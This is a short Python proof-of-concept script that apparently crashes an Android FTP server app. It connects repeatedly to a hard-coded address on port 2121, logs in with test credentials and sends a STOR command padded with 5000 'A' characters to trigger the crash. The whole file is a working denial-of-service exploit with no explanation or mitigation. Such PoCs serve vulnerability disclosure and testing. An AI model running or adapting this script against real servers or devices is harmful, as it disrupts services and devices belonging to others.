#!/usr/bin/python
# Android FTPServer PoC Device Crash

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "STOR " + "A" * 5000 + "\r\n"
for x in xrange(1,31):
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print x
 s.connect(('172.16.30.108',2121))

 data=s.recv(1024)
 s.send("USER test\r\n")
 data=s.recv(1024)
 s.send("PASS test\r\n")

 s.send(buffer)

 s.send("QUIT")

 s.close()